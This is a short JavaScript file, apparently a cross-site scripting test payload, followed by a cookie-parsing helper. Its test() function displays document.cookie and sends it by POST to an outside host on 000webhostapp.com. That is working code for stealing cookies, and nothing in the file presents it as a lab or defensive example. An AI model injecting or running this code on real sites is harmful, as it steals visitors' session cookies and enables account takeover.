

function test() {
    alert(document.cookie);
    fetch('https://sci2u.000webhostapp.com/', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
    });
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
}

//test2









